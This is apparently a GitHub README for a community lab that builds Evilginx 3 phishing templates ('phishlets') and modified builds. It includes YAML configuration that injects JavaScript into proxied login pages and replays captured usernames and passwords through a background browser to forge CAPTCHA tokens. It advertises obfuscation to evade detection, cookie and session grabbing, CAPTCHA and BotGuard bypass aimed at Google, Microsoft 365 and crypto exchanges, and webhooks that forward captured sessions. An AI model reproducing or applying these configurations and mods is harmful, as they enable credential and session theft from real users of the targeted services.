# Evilginx 3 PHISHLET
<img align="left" src="https://github.com/user-attachments/assets/9655710b-1b9e-4ed7-894a-b5109aecff6c" width="450" height="550">

This repository was created solely to assist in the creation of PHISHLETS / Modification of the Evilginx software itself / In solving any problems associated with this software and PHISHLETS.

__Preface:__ At the moment, there are a very large number of scammers who sell public, raw goods, people who do not understand at all how Reverse Proxy works. Watching these people on hacker sites, telegram channels and on the Internet in general becomes funny. There is nothing complicated in creating a template for EvilGinx; the entire manual is described by the founder himself 
[kgretzky](https://github.com/kgretzky) "Owner") __[__thanks to him for this creation__]__ It is for this reason that we decided to make a small laboratory for mutual assistance in this matter.

### #Installation Steps​
Learn how to install Evilginx locally or deploy it on a remote server [Deployment](https://help.evilginx.com/docs/category/deployment) / Learn how to set up Evilginx and run your first phishing campaign [Quick Start](https://help.evilginx.com/docs/getting-started/quick-start) / Learn how to use Evilginx [Guides](https://help.evilginx.com/docs/category/guides) __[ CONFIG X PHISHLETS X LURES X REDIRECTORS X SESSIONS X PROXY X BLACKLIST ]__

### #Phishlet Format (v3.0.0-vX.X.X)

Phishlets are configuration files in YAML format. If you need to get familiar with YAML, first, you can find some good overview here: [YAML Syntax](https://docs.ansible.com/ansible/latest/reference_appendices/YAMLSyntax.html) 
Phishlet Format [Create](https://help.evilginx.com/docs/phishlet-format) 

### #js_inject
This section defines all Javascript scripts that you want to inject into proxied pages. Every script can be customized with {var_name} variable parameters, which later can be set to different values in each created lure.
```
js_inject:
  - trigger_domains: ["www.domain.com"]
    trigger_paths: ["/uas/login"]
    trigger_params: ["email"]
    script: |
      function lp(){
        var email = document.querySelector("#username");
        var password = document.querySelector("#password");
        if (email != null && password != null) {
          email.value = "{email}";
          password.focus();
          return;
        }
        setTimeout(function(){lp();}, 100);
      }
      setTimeout(function(){lp();}, 100);
```
>### info
This part applies only to Evilginx Pro users who have access to Evilpuppet module.

Interactive background browser sessions, spawned on-demand, with sole purpose of forging secret tokens to be used within the proxied Evilginx session.

```
evilpuppet:
  triggers:
    - domains: ['www.domain.com']
      paths: ['/sessions']
      token: 'recaptcha_token'
      open_url: 'https://www.domain.com/signin'
      actions:
        - selector: '#email'
          value: '{username}'
          enter: false
          click: false
          post_wait: 0
        - selector: '#password'
          value: '{password}'
          enter: false
          click: false
          post_wait: 0
        - selector: '#stay_signed_in'
          click: true
          post_wait: 0
        - selector: '#signin_button'
          click: true
          post_wait: 0
  interceptors:
    - token: 'recaptcha_token'
      url_re: '/sessions'
      post_re: 'recaptcha_token=([^&]*)'
      abort: true
```
#5 Puppeteer integration with Evilginx 

Evilginx X Puppeteer
https://github.com/Evi1Grey5/Evilginx-3-PHISHLET-LAB/issues/13

## Evilginx Labs by [Evi1Grey5]

<div align="center">
  <a href="https://www.veed.io/view/6859392c-a7e7-4590-bfa2-682d0431ea85?panel=quality-survey"><img src="https://github.com/user-attachments/assets/b21580a1-db99-45a1-b497-38a61f7118b1" alt="IMAGE ALT TEXT"></a>
</div>

<mp4 src="https://www.veed.io/view/6859392c-a7e7-4590-bfa2-682d0431ea85?panel=quality-survey">

# Evilginx 3.9.0
<img align="left" src="https://github.com/user-attachments/assets/67c5cb62-7c60-40b2-bb0e-4a30eaeb2949" width="450" height="550">

#### We also added Puppeteer to Evilginx and added some modifications to the http_proxy.go and phishlet.go. It turned out to be a juicy mod.

We decided to make a good mod for Evilginx. By adding Evil Puppet to it / Sending notifications via Discord / Module for generating PHISHLETs, collecting configurations via Burp Suite [ Functionality:

- Template Generation: The module can create various violet templates that mimic legitimate websites.
- Content Customization: The user can customize text, images, and other elements to make the phishlet more believable.
- Integration with Burp Suite: The module can be integrated into Burp Suite to facilitate the testing and vulnerability analysis process.
- Automation: Allows you to quickly create many phishlets for different scenarios.]


# Evilginx 3.7.1
<img align="left" src="https://github.com/user-attachments/assets/40051408-78b0-4e27-9292-c6784f078b89" width="450" height="550">

## Fixed / Added ##

- Telegram / Discord WebHook.
- Identifier obfuscation to prevent websites from detecting evilginx.
- Fixed: Cookie grab failure when cookies have protection symbols. (Problem was that some of the symbols used in cookies are not supported by the original evilginx and it can't detect the set-cookie event. )
- Fixed: Stability issues with original evilginx. Open doors to handle unlimited number of users at the same time.
- Fully obfuscated hardcoded http_proxy.go file that is not readable to prevent fast red-flag on domains.
- Capture and proxying captcha / re / h /v2,v3.

- Cloudflare: Required if site has Cloudflare Anti-DDoS page enabled.
- BotGuard: Required for sites like Google (verified, trusted accounts), Microsoft o365 (some of) 3rd parties login pages usually big companies or extra protection without it lets say only 70% accounts would work etc etc.
- hCaptcha, recaptcha - Required for sites that have hCaptcha, recaptcha on forms or as Anti-Ddos.
- GeeTest: Needed for crypto websites like Binance, Coinbase, Blockchain etc etc
- Custom JS: Required for sites that have their own protection for certain actions.

________________________________________
### Adding "interceptors" to Evilginx // 
________________________________________
- You will be able to monitor and analyze HTTP requests and WebSocket messages that pass through your Evilginx server. This can help in understanding user behavior and identifying potential vulnerabilities.
- Data collection. Intercepting requests may allow you to collect information about users, such as credentials, access tokens, and other sensitive information, if you use Evilginx for phishing.
- Debugging. If you are developing or testing your Evilginx templates, JavaScript code integration can help you debug and identify functionality issues by showing what data is being sent and received.
- Adaptation and modification: By using request interception, you can adapt the behavior of your Evilginx server depending on the data received, for example, change messages or redirects based on the contents of requests.
[Low-level network interception library](https://github.com/mswjs/interceptors) 

### Turnkey installation Evilginx 3.9.0 #16

Questions about installing/receiving the update [#16](https://github.com/Evi1Grey5/Evilginx-3-PHISHLET-LAB/issues)

>### info
Also, all additional information is listed in the "issues" section. Read, ask your questions, share your knowledge in the Discussion section.
Whenever possible, we will post new PHISHLETS / Information about tool customization. You also need to participate in order to develop this project.
____________________

Evilginx 3 [PHISHLET] by Evi1Grey5 [CUSTOM CREATION / FREE / DEVELOPMENT]
<img align="left" src="https://injectexp.dev/assets/img/logo/logo1.png">

Contacts:
injectexp.dev / 
pro.injectexp.dev / 
Telegram: @Evi1Grey5 [support]
Tox: 340EF1DCEEC5B395B9B45963F945C00238ADDEAC87C117F64F46206911474C61981D96420B72
